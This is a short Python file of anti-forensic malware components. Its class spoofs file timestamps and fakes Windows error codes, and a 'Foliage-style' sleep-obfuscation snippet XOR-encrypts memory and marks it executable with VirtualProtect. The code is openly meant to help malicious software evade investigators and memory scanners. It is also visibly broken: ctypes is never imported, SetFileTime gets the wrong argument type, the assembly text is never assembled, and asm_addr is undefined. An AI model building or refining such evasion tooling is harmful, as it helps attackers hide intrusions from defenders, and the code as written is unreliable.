import time
import random

class AntiForensic:
    @staticmethod
    def spoof_timestamps(filepath: str):
        ts = random.randint(1577836800, 1893456000)  # 2020-2030
        ctypes.windll.kernel32.SetFileTime(
            ctypes.windll.kernel32.CreateFileA(filepath, 256, 0, None, 3, 128, None), 
            ctypes.byref(ctypes.c_long(ts)), 
            None, None
        )

    @staticmethod
    def generate_fake_errors():
        error_codes = {0x80070005, 0xC0000005, 0x80004005}
        ctypes.windll.ntdll.RtlSetLastWin32Error(random.choice(list(error_codes)))

# Sleep Obfuscation Snippet (Foliage-style)  
def encrypt_memory(key: bytes):  
    asm = f"""  
    mov rax, {int.from_bytes(key, 'little')}  
    xor [rsi], rax  
    add rsi, 8  
    """  
    ctypes.windll.kernel32.VirtualProtect(asm_addr, len(asm), 0x40, ctypes.byref(ctypes.c_ulong()))  